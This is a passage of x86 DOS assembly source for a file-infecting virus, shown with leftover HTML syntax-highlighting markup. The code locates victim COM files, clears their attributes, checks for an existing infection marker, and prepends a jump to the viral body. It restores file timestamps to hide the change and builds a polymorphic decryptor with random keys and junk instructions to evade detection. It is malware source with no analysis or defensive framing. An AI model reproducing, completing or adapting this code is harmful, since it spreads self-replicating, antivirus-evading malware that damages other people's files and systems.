&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lea &nbsp; &nbsp; si,[di-5]<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; cs<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; ds<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lodsw &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;make sure its not EXE<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; ax,'</span>E<span style="color: #339933;">.</span><span style="color: #7f007f;">'<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; je&nbsp; &nbsp; &nbsp; short Exit_Inf<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; std &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;find begin of filename<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; cx,si<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; inc &nbsp; &nbsp; cx<br />
<br />
Get_Victim:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lodsb<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; al,'</span><span style="color: #339933;">:</span><span style="color: #7f007f;">'<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; je&nbsp; &nbsp; &nbsp; short Got_Victim<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; al,'</span>\<span style="color: #7f007f;">'<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; je&nbsp; &nbsp; &nbsp; short Got_Victim<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; loop&nbsp; &nbsp; Get_Victim<br />
<br />
Got_Victim:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cld<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,3300h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;get ctrl-break flag<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 3<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; dx&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;save flag on stack<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cwd &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;clear the flag<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; inc &nbsp; &nbsp; ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 3<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,3524h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;get int24 vector<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 3<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; es bx cs&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;save vector on stack<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; ds<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lea &nbsp; &nbsp; dx,INT_24h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;install new int24 handler<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ah,25h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; so errors wont be<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; ax&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; generated<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 3<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,4300h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;get file-attributes<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cwd<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 3<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; cx&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;save attributes on stack<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sub &nbsp; &nbsp; cx,cx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;clear attributes<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,4301h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 3<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jc&nbsp; &nbsp; &nbsp; short Rest_Attribs<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,3D02h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;open the file<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 3<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jc&nbsp; &nbsp; &nbsp; short Rest_Attribs<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xchg&nbsp; &nbsp; bx,ax &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;save handle<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,5700h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;get file date &amp; time<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 3<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; dx&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;save date &amp; time on stack<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; cx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; cx,4&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;read beginning of file<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lea &nbsp; &nbsp; si,Orig_Bytes<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; dx,si<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ah,3Fh<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 3<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jc&nbsp; &nbsp; &nbsp; short Close_File<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,4202h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;goto end, get filelength<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sub &nbsp; &nbsp; cx,cx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cwd<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 3<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lea &nbsp; &nbsp; di,File_Len &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;save filelength<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; [di],ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; [di+2],dx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; al,byte ptr [si + 3]&nbsp; &nbsp; ;already infected?<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; al,'</span>O<span style="color: #7f007f;">'<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; je&nbsp; &nbsp; &nbsp; short Close_File<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; word ptr [si],'</span>ZM<span style="color: #7f007f;">'&nbsp; &nbsp; &nbsp; ;EXE with COM ext?<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; je&nbsp; &nbsp; &nbsp; short Close_File<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,word ptr [di]&nbsp; &nbsp; &nbsp; &nbsp; ;check length of file<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; dx,ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; inc &nbsp; &nbsp; dh<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; call&nbsp; &nbsp; Engine&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;make encryption engine, and<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; infect file<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jne &nbsp; &nbsp; short Close_File<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; byte ptr [si],0E9h&nbsp; &nbsp; &nbsp; ;put '</span><span style="color: #00007f; font-weight: bold;">JMP</span> xxxx<span style="color: #7f007f;">' at begin<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sub &nbsp; &nbsp; al,3&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;subtract JMP xxxx size<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; word ptr [si+1],ax&nbsp; &nbsp; &nbsp; ;finish JMP statement<br />
<br />
;--- Goto new offset DX:AX --------------------------------<br />
gotobegin:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sub &nbsp; &nbsp; ax,ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cwd<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xchg&nbsp; &nbsp; dx,cx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xchg&nbsp; &nbsp; dx,ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,4200h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 3<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; byte ptr [si+3],'</span>O<span style="color: #7f007f;">'<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; cx,4&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;write new beginning<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; dx,si<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ah,40h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 3<br />
<br />
Close_File:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; cx dx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;restore date &amp; time<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,5701h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 3<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ah,3Eh ;close the file<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 3<br />
<br />
Rest_Attribs:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; ax cx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;restore attributes<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cwd<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 3<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; ax dx ds&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;restore int24 vector<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 3<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; ax dx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;restore ctrl-break flag<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int &nbsp; &nbsp; 3<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ret<br />
<br />
;--- Initialize encryption generator ----------------------<br />
Engine:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; ax dx si bp es&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;save registers<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cli<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; word ptr [di-4],ss&nbsp; &nbsp; &nbsp; ;save SS &amp; SP<br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; word ptr [di-2],sp<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,cs &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;new stack &amp; buffer-segment<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ss,ax<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; sp,((0D0h + 160h) * 10h);virus plus workspace<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; add &nbsp; &nbsp; ax,0D0h &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;virus space<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; es,ax &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;work segment in ES<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sti<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; ds<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; bp,dx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;start of decryptor<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; dx,100h &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;beginning of code to encrypt<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; cx,(last - Entry) &nbsp; &nbsp; &nbsp; ;length of virus<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sub &nbsp; &nbsp; si,si &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;distance between encryptor<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;and code<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; di bx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; dx&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;save offset of code<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; si&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;save future offset of code<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sub &nbsp; &nbsp; di,di &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;di = start of decryptor<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; call&nbsp; &nbsp; Random_Number &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;get random # of junk bytes<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; and &nbsp; &nbsp; ax,7Fh&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;maximum # of junk bytes = 7Fh<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; add &nbsp; &nbsp; cx,ax &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;add it to file size<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; cx&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;save length of code + junk<br />
<br />
;--- Get random encryption key ----------------------------<br />
Key:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; call&nbsp; &nbsp; Random_Number &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;get random encryption value<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; or&nbsp; &nbsp; &nbsp; al,al<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jz&nbsp; &nbsp; &nbsp; short key &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;again if 0<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ds:[XOR_Val],ax<br />
<br />
;--- Generate encryption method ---------------------------<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; call&nbsp; &nbsp; Random_Number &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;get random flags<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xchg&nbsp; &nbsp; bx,ax<br />
<br />
;--- Encryption method stored in BX -----------------------<br />
; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;bit 0: how to encrypt<br />
; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;bit 1:<br />
; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;bit 2: which register used for encryption<br />
; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;bit 3:<br />
; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;bit 4: use byte or word for encrypt<br />
; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;bit 5: MOV AL, MOV AH or MOV AX<br />
; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;bit 6: MOV CL, MOV CH or MOV CX<br />
<br />
; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;bit 7: AX or DX<br />
; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;bit 8: count up or down<br />
; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;bit 9: ADD/SUB/INC/DEC or CMPSW/SCASW<br />
; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;bit A: ADD/SUB or INC/DEC<br />
; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; CMPSW or SCASW<br />
; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;bit B: offset in XOR instruction?<br />
; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;bit C: LOOPNZ or LOOP<br />
; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; SUB CX or DEC CX<br />
; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;bit D: carry with crypt ADD/SUB<br />
; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;bit E: carry with inc ADD/SUB<br />
; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;bit F: XOR instruction value or AX/DX<br />
<br />
;--- Generate encryption engine ---------------------------<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; call&nbsp; &nbsp; Fill_NOPs &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;insert random instructions<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; cx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ax,0111h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;make flags to remember which<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; test&nbsp; &nbsp; bl,20h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; MOV instructions are used<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jnz &nbsp; &nbsp; short Test_4_Reg<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor &nbsp; &nbsp; al,7<br />
<br />
Test_4_Reg:<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; test&nbsp; &nbsp; bl,0Ch&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;testing for registers?<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jnz &nbsp; &nbsp; short Check_4_Cx<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor &nbsp; &nbsp; al,70h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;don'</span>t use <span style="color: #46aa03; font-weight: bold;">CX</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">CH</span> <span style="color: #00007f; font-weight: bold;">or</span> <span style="color: #46aa03; font-weight: bold;">CL</span><br />
<br />
Check_4_Cx<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">40h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;use CX, CH or CL?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; short Byte_Or_Word<br />
